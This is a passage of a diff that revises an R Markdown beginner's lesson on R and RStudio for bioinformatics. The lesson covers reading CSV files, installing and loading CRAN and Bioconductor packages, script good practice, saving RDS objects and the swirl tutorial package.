-*Question 3*: How can you add 2 for each cell of the dataframe ?
+*Question 3*: How can you increase all values of our data.frame by 2 ?
 
 <details>
 
@@ -617,17 +735,18 @@ three4five6
 
 ### Read a table as data frame
 
-Exercise: Use the _Help pane_ to find how to use the function [`read.csv()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/read.table).
+Exercise: Use the _Help pane_ to find how to use the [`read.csv()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/read.table) function.
 
-You can find example_table.csv [here](https://github.com/gustaveroussy/training_bigr/blob/main/Introduction_R_RStudio/For_Students/example_table.csv)(download it by clocking on the "Download raw file" button).
+You can find the example_table.csv input file [here](https://github.com/gustaveroussy/training_bigr/blob/main/Introduction_R_RStudio/For_Students/example_table.csv). Download it by clicking on the **[Download raw file]** button.
 
-Use the function [`read.csv()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/read.table) to:
+Use the [`read.csv()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/read.table) function to:
 
 1. open the _file_ `example_table.csv`. 
-2. this table has a _header_ (`TRUE`). 
+2. this table has a _header_ (`TRUE`). A header is a title line that defines column names. 
 3. this table has _row names_ in the column called "Gene_id".
+4. as a CSV file, its field separator is a comma _,_.
 
-Let all other parameters to their default values. 
+Let all other parameters to their default values.
 
 Save the opened table in a _variable_ called `example_table`.
 
@@ -647,48 +766,47 @@ example_table <- read.csv(
 
 Now let us explore this dataset.
 
-We can click on environment pane:
+We can click on the 'Environment' pane:
 
 ![see_in_the_env_pane](images/rstudio_exmaple_table_environment.png)
 
-And if you click on it:
+And if you click on it :
 
 ![open_example_table](images/rstudio_example_table_open.png)
 
-Be careful, large table may hang your session.
+Be careful ! Visualizing a large table may hang your session (by consuming to much RAM).
 
-Alternatively, we can use the function [`head()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/head) which prints the first lines of a table:
+Alternatively, we can use the [`head()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/head) function, which prints the first lines of a table:
 
 ```{r explore_table_one, eval=TRUE}
 head(example_table)
 ```
 
-The function [`summary()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/summary) describes the dataset _per sample_:
+The [`summary()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/summary) function describes the dataset _per sample_ (per column) :
 
 ```{r first_summary_on_df, eval=TRUE}
 summary(example_table)
 ```
 
-Have a look at the [`summary()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/summary) of the dataset _per gene_, using the function [`t()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/t) to _transpose_:
+Have a look at the [`summary()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/summary) of the dataset _per gene_, using the [`t()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/t) function to _transpose_:
 
 ```{r first_summary_on_df_t, eval=TRUE}
 head(t(example_table))
 summary(t(example_table))
 ```
 
-
 <details>
 
 <summary>To go further</summary>
 
 ```{r to_go_further, eval=TRUE}
-# number of column
+# number of columns
 ncol(example_table)
-# number of row
+# number of rows
 nrow(example_table)
-# get dimension (number of row and number of column)
+# get dimensions (number of rows and number of columns)
 dim(example_table)
-# type of each elements
+# type of each element
 str(example_table)
 
 ```
@@ -696,34 +814,34 @@ str(example_table)
 </details>
 
 
-## TLDR – Too Long Didn't Read
+## TLDR – Too Long Didn't Read !
 
 ```{r tldr_basics}
-# Declare a variable, and store a value in it:
+# Declare a variable, and store a value inside :
 three <- 3
 
-# Basic operators: + - / * work as intended:
+# Basic maths operators: + - / * work as intended:
 six <- 3 + 3
 
-# Quotes are used to delimiter text:
+# Quotes are used to delimit characters:
 seven <- "7"
 
-# You cannot perform maths on text:
+# You cannot perform maths on characters :
 "7" + 8 # raises an error
 seven + 8 # also raises an error
 six + 8 # works fine
 
-# You can change the type of your variable with:
+# R makes the most to help you. You can change the type of your variable with:
 as.numeric("4") # the character '4' becomes the number 4
 as.character(10) # the number 10 becomes the character 10
 
-# You can compare values with:
+# You can compare values, returns a logical :
 six < seven
 six + 1 >= seven
 identical(example_table, mixed_data_frame)
 
 
-# You can load and save a dataframe with:
+# You can load and save a data.frame as/from a text file :
 read.table(file = ..., sep = ..., header = TRUE)
 write.table(x = ..., file = ...)
 
@@ -733,10 +851,10 @@ my_table <- data.frame(...)
 # Create a vector with:
 my_vector <- c(...)
 
-# You can see the firs lines of a dataframe with:
+# You can read the first lines of a data.frame :
 head(example_table)
 
-# Search for help in the help pane or with:
+# Search for help in the 'Help' pane or with:
 help(...)
 ```
 
@@ -745,25 +863,25 @@ help(...)
 
 ## What are modules and packages
 
-Modules and package are considered to be the same thing in this lesson. The difference is technical and does not relates to our session.
+Modules and package are considered to be the same thing in this lesson. The difference is technical and does not relate to our scope.
 
-Most of the work you are likely to do with R will require one or several packages. A package is a list of functions or pipelines shipped under a given name. In general, a package groups together functions linked to an analysis theme or the same objective.
-Every single function you use through R comes from a package or another.
+Most of the work you are likely to do with R will require one or multiple additional packages. A package is a list of functions, pipelines, or datasets shipped under a given name. In general, a package groups together functions linked to an analysis scheme or theme towards a defined aim.
+Every single function you use through R comes from a package or another. Those used till now in this lesson come mostly from the 'base' package (R is shipped with a short list of mandatory packages)
 
-Read the very first line of the help pane:
+Invoke the help page for the `head` function, and read the very first line of the 'Help' pane :
 
 ```{r help_pane_package, eval=FALSE}
 help(head)
 ```
 
-It reads: `help {utils}`. The function `help` comes from the package `utils`.
+It reads: `help {utils}` : The function `help` comes from the package `utils`.
 
 ```{r head, eval=TRUE}
 # Call the function "help", with the argument "example_table", and show only the first line
 head(example_table, 1)
 ```
 
-> <span style="color:#CD853F"> Warning: Sometime, two package may have a function with the same name. They are most certainly not doing the same thing. IMHO, it is a good habbit to always call a function while disambiguating the package name. `utils::help()` is better than `help()` alone.</span>
+> <span style="color:#CD853F"> WARNING : Sometimes, two packages may share the same name for different functions ! They are most certainly not doing the exact same thing. IMHO, it is a good habbit to ALWAYS call a function while disambiguating the package name, using thins syntax : `package::function`. Writing `utils::help()` is better, clearer than using `help()` alone.</span>
 
 ```{r use_package_name, eval=TRUE}
 # Call the function "help" ***from the package utils***, with the argument "example_table", and show only the first line
@@ -772,7 +890,9 @@ utils::head(example_table, 1)
 
 ## Install a package
 
-You may install a new package.
+Your work will probably require the installation of a new package from an external source.
+
+R can install packages from multiple different sources and repositories, but by default, it installs from the CRAN repository.
 
 Use [`install.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/install.packages) to install a package.
 
@@ -781,41 +901,55 @@ Use [`install.packages()`](https://www.rdocumentation.org/packages/utils/version
 install.packages("dplyr")
 ```
 
-This will raise a prompt asking for simple questions : where to download from (choose somewhere in France), whether to update other packages or not, etc.
+This will raise a prompt asking for simple questions : from which mirror site to download (choose somewhere in France), whether to update other packages or not, etc.
 
-Do not be afraid by the large amount of things prompted in the console and let R do the trick.
+Do not be afraid by the large amount of things prompted in the console and let R do the trick. These are messages from the different steps required by to safely install a package and test if it's perfectly installed and usable. It may also take time, especially when the requested package to install requires other packages (dependencies), that may themselves require other packages (etc...). Almost any code relies on another code !
 
-Alternatively, you can click Tool -> Install Packages in RStudio; or click on the "install" button in the tab Packages of the pane File/Help.
+Alternatively, you can click on [Tool] -> [Install Packages] in RStudio; or click on the [install] button in the 'Packages' tab of the 'File/Help' pane.
 
-You can list installed packages with [`installed.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/installed.packages), and find for packages that can be updates with [`old.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/update.packages). These packages can be updated with [`update.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/update.packages).
+You can list installed packages with [`installed.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/installed.packages), and find for packages that can be updated with [`old.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/update.packages).
 
-While the function [`install.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/install.packages) searches packages in the common R package list, many bioinformatics packages are available on other shared packages warehouses. Just like AppleStore and GoogleStore do not have the same applications on mobile, R has multiple sources for its packages. You need to know one of them, and one only [Bioconductor](https://bioconductor.org/).
+These packages can be updated with [`update.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/update.packages).
+
+While the [`install.packages()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/install.packages) function searches packages in the common R package list, many bioinformatics-related packages are available on other shared packages warehouses. Just like your AppStore and PlayStore do not have the same applications on your cellular, R has multiple sources for its packages. As someone invested in biology who wants to use R, in addition to the default CRAN repository, you need to know another one : [Bioconductor](https://bioconductor.org/).
 
 ![bioconductor](images/bioconductor.png)
 
-You can use Bioconductor with the function [`BiocManager::install()`](https://www.rdocumentation.org/packages/BiocManager/versions/1.30.18):
+You can install a package from Bioconductor with the [`BiocManager::install()`](https://www.rdocumentation.org/packages/BiocManager/versions/1.30.18) function :
 
 ```{r bioconductor_install_example}
-# Install BiocManager, a package to use Bioconductor
+# Install BiocManager, a package to use Bioconductor, from CRAN
 install.packages("BiocManager")
 
 # Install a package from Bioconductor
 BiocManager::install("DESeq2")
 ```
 
+Hopefully, BioConductor knows that the CRAN exists, so when one requests the installation of a BioConductor package that depends on CRAN packages, the installer will get them without any human intervention.
+
 
 ## Use a package
 
-All installed packages are not activated in your working session.
-You can load a package with the function [`library()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/library):
+An _installed_ package is not actually _active_ by default (you can't use its functions just because it is installed). When you want to use something from an installed package, you need to _invoke_ it first.
+
+You can load a package with the [`library()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/library) function :
 
 ```{r load_package}
 library(package="dplyr")
 ```
 
-If the package is not installed, you will get an error.
+If the requested package is not locally installed, this will raise an error.
 
-If there is no error message, then you can try:
+If there is no error message, it implies that the package is loaded.
+
+When a package is loaded, all its content (functions, objects, datasets, ...) are accessible and loaded into RAM.
+
+
+> NOTE 1 : when a package is loaded, its box in the 'Packages' pane is ticked.
+
+> NOTE 2 : There is an exception to the package invocation requirement : when one calls a function with disambiguation syntax `package::function()`, only the requested function is loaded into memory for the duration of its exectution, then detached.
+
+Then you can try :
 
 ```{r use_package}
 help(topic="arrange", package="dplyr")
@@ -823,7 +957,9 @@ help(topic="arrange", package="dplyr")
 
 And search for help about how to run your command.
 
-Alternatively, there is a more complete help page, with the function [`browseVignettes()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/browseVignettes). It opens your browser automatically, and if you click on "HTML", you get some information about the package like functions, tutorials, etc.
+Alternatively, there is a more complete help page at the package, reached with the [`browseVignettes()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/browseVignettes) function. It opens in your browser automatically (or in the Rstudio browser, depending on your configuration), and if you click on "HTML", you get some information about the package like functions, tutorials, etc.
+
+> NOTE : However, such a vignette is facultative in a R package : its presence only depends on the will of the package coder(s).
 
 ```{r vignette_package}
 browseVignettes(package="dplyr")
@@ -832,13 +968,13 @@ browseVignettes(package="dplyr")
 ## TLDR – Too Long Didn't Read
 
 ```{r packages_tldr}
-# Install a package with the following function
+# Install a CRAN package
 install.packages("BiocManager")
 
 # Load a package
 library("BiocManager")
 
-# Install a package from Bioconductor
+# Install a BioConductor package
 BiocManager::install("DESeq2")
 
 # Get help
@@ -849,20 +985,20 @@ browseVignettes(package="DESeq2")
 
 ## Write a good script
 
-Good practice:
+Good practices (for your sake, and the one of any future reader of your code) :
 
- - make a documentation (a header at the start of the script which explains the purpose of the script, and the analysis steps for example),
- - comments (uninterpreted line, begin by `#`),
- - code indentation (spaces before code line),
- - understandable variable names,
- - do not nest too many functions inside each other,
+ - write a documentation (a header at the start of the script which explains the purpose of the script, an explanation of the parameters you setup, and the analysis steps, for example)
+ - use comments (uninterpreted line, starting with `#`)
+ - use code indentation (spaces before code line that shows their hierarchical structure)
+ - use humanly-understandable variable names
+ - do not nest too many functions inside each other, this will soon be a mess
  
 ```{r bad_good_example, eval=FALSE}
-### difficult to understand
+### BAD ; difficult to understand
     print(rowMeans(data.frame(c(9, 14, 17, 9, 13),
 c(11, 10, 20, 7, 17),c(15, 8,      19, 10, 15)   ))       )
 
-### easy to understand
+### GOOD : easy to understand
 ## Goal: this script computes the mean of the expression of our 3 samples for each gene:
 #create a dataframe with the genes expression of our 3 samples:
 example_data_frame <- data.frame("Expression_Sample_1" = c(9, 14, 17, 9, 13),
@@ -877,60 +1013,63 @@ mean_expression_Samples123 <- rowMeans(example_data_frame)
 print(mean_expression_Samples123)
 ```
  
- - save your script regularly, as well as your working environment,
- - save the versions of the loaded packages at the end of your analysis (you can print loaded packages thanks to the function [`sessionInfo()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/sessionInfo) and save the result into a file thanks to the function [`capture.output()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/capture.output)).
+ - save your script frequently, as well as your working environment
+ - use backspaces in your code. This brings fresh air into the compact mess of character your code can be.
+ - save the versions of the loaded packages at the end of your analysis (you can print loaded packages thanks to the [`sessionInfo()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/sessionInfo) function and save the result into an on-disk file thanks to the [`capture.output()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/capture.output)) function.
  
 ```{r sessionInfo, eval=TRUE}
-sessionInfo() #display versions of loaded packages in the console
+sessionInfo() #displays name and version of loaded packages in the console
 ```
 ```{r sessionInfo_capture, eval=FALSE}
-utils::capture.output(sessionInfo(), file="sessionInfo.txt") #save them in a file
+utils::capture.output(sessionInfo(), file = "sessionInfo.txt") #save them in a file
 ```
 
 ## Load and save R objects
 
-While working on your projects, you will process datasets in R. The results of these analyses will be stored on variables. This means, that when you close RStudio, some of this work might be lost.
+While working on your projects, you will process datasets in R. The results of these analyses will be stored in variables. All these are stored _in memory_, which is volatile. This means, when you close RStudio, any unsaved object will be lost.
 
-We already saw the function [`save.image()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/save) to save a complete copy of your working environment.
+We already depicted the [`save.image()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/save) function to save a copy of your **complete** working environment.
 
-However, you can save _only the content of a given variable_. This is useful when you want to save the result of a function (or a pipeline) but not the whole 5 hours of work you've been spending on how-to-make-that-pipeline-work-correctly.
+However, you can save _only the content of a given variable_, solely. This is useful when you want to save the result of a function (or a pipeline) but not the whole 5 hours of trials and error work you've been spending on how-to-make-that-bloody-pipeline-work-correctly.
 
-The format is called: [RDS](https://www.r-bloggers.com/2016/12/remember-to-use-the-rds-format/) for R Data Serialization. This is done with the function [`saveRDS()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/readRDS):
+The (compressed) format to save an object is called  [RDS](https://www.r-bloggers.com/2016/12/remember-to-use-the-rds-format/) for R Data Serialization. This is done using the [`saveRDS()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/readRDS) function :
 
 ```{r save_rds_use, eval=FALSE}
 saveRDS(object = example_table, file = "example_table.RDS")
 ```
 
-You can also load a RDS into a variable. This is useful when you receive a RDS from a coworker, or you'd like to keep going your work from a saved point. This is done with the function [`readRDS()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/readRDS):
+Hopefully, you can load a RDS content into a variable ! This is useful when you receive a RDS from a coworker, or you'd like to keep going your work from a saved point. This is done with the [`readRDS()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/readRDS) function :
 
 ```{r load_rds, eval=FALSE}
 example_table <- readRDS(file = "example_table.RDS")
 head(example_table)
 ```
 
+> NOTE : You can see in the example above that loading an object save as a RDS requires to inject it in a _variable_. This means that the RDS contains the object, but unnamed. This is not the case when saving an environment (using `save()`), as _all_ loaded objects are saved, thus their respective names are kept.
+
 ## Human data
 
-<span style="color:#CD853F"> Warning: If you hold human-related genomic datasets. You cannot use/upload these data anywhere. This is illegal, and doing surch thing may lead to 5 years in prison and up to 300 000€ fine. [Art. 226-16, Section 5, Code pénal](https://www.cnil.fr/fr/les-sanctions-penales).</span>
+<span style="color:#CD853F"> WARNING : If you hold human-related genomic datasets that can allow person identification (ie, sequences), you cannot use/upload these data anywhere without control. This is strictly illegal, and such behavior may take your for up to 5 years in jail, assorted to a 300 000€ fine. [Art. 226-16, Section 5, Code pénal](https://www.cnil.fr/fr/les-sanctions-penales).</span>
 
-## Packages updates
+## Packages update
 
-It is a good practice to maintain package versions within a work project. If you update a package (whether by need, or by will), then you should restart your work from the begining. This stands as long as you're not 100% sure the update does not affect your results.
+It is a good practice to maintain package versions within a work project. If you update a package (whether by need, or by will), then you should restart your work from the start. This stands as long as you're not 100% sure the update does not affect your results.
 
-# Swirl R package
+# The Swirl package
 
-How to continue to learn R?
+What if I would like to pursue learning R by myself, when I can or want ?
 
 <img src="images/swirl_new_large_final.png" alt="swirl_new_large_final" width="200"/>
 
 ## What is swirl?
 
-[`swirl`](https://swirlstats.com/) is an R package that teaches you R programming and data science interactively, at your own pace, and right in the R console.
+[`swirl`](https://swirlstats.com/) is an R package that teaches you R programming and data science interactively, at your own pace, and straight into the R console.
 
-It presents a choice of course lessons and interactively tutors a student through them. A student may be asked to watch a video, to answer a multiple-choice or fill-in-the-blanks question, or to enter a command in the R console precisely as if he or she were using R in practice. Emphasis is on the last, interacting with the R console. User responses are tested for correctness and hints are given if appropriate.
+It presents a choice of course lessons and interactively tutors a student through them, with multiple levels of complexity. A student may be asked to watch a video, to answer a multiple-choice or fill-in-the-blanks question, or to enter a command in the R console precisely as if he or she were using R in practice. Emphasis is on the last, interacting with the R console. User responses are tested for correctness and hints are given if appropriate.
 
-Progress is automatically saved so that a user may quit at any time and later resume without losing work.
+Progress is automatically saved so that one may quit at any time and later resume without losing anything.
 
-## Installation and using
+## Installation and usage
 
 ```{r swirl, eval=FALSE}
 #install package
@@ -945,7 +1084,7 @@ swirl()
 Enjoy!
 
 <details>
-<summary>Other command lines for swirl using</summary>
+<summary>Other useful command lines for swirl usage</summary>
 
 ```{r swirl_add, eval=FALSE}
 #quit swirl
@@ -966,11 +1105,18 @@ info()
 
 # Conclusion
 
-No programming language is better than any other. Anyone saying the opposite is (over)-specialized in the language they are advertising.
+No programming language is better than any other. They all serve different purposes. Anyone telling the opposite is (over)-specialized in the language they are advertising (and probably have a strong lack of objectivity.
 
-In the field of bioinformatics, languages used by the community are quite limited. THere are [_bash_](https://www.gnu.org/software/bash/), [_R_](https://www.r-project.org/) and [_Python_](https://www.python.org/). While learning [_bash_](https://www.gnu.org/software/bash/) cannot be escaped nowadays, it is not enough to perform a complete analysis with publication ready figures and results. You should be interested in another programming language: [_R_](https://www.r-project.org/) and/or [_Python_](https://www.python.org/). R allows you to do a lot of different analyses, and it has a large user community with lots of online help, so it's one of the easiest languages for beginners.
+In the field of bioinformatics, languages used by the community are quite limited. The main, widely adopted options are :
 
-Please, note that this advice is valid today, but may change. Other programming languages are used, some have lost their place on the podium, and others are trying to supersede [_bash_](https://www.gnu.org/software/bash/), [_R_](https://www.r-project.org/), and [_Python_](https://www.python.org/).
+- [_bash_](https://www.gnu.org/software/bash/)
+- [_R_](https://www.r-project.org/)
+- [_Python_](https://www.python.org/).
+
+While learning [_bash_](https://www.gnu.org/software/bash/) cannot be escaped nowadays to interact with a HPC, it is not enough to perform a complete analysis with publication-ready figures and shaped results. You should get interest in another programming language: [_R_](https://www.r-project.org/) and/or [_Python_](https://www.python.org/). R allows you to do a lot of different analyses, and it has a large user community with lots of online resources for help. As such, it's one of the easiest languages for beginners.
+
+Please, note that this advice is valid today, but may change. Mainy other programming languages are used, some have lost their place on the podium, and others are trying to supersede [_bash_](https://www.gnu.org/software/bash/), [_R_](https://www.r-project.org/), and [_Python_](https://www.python.org/). An example is [_Julia_](http://julialang.org/)
 
 <div style="float: right;">Thibault: "Anyway [_Python_](https://www.python.org/) is the best programming language in the WORLD. Don't listen to Bastien."</div>
 
+<div style="float: right;">Bastien: "Huh, Thibault.. Remember when one talked about _objectivity_ ? :p"</div>
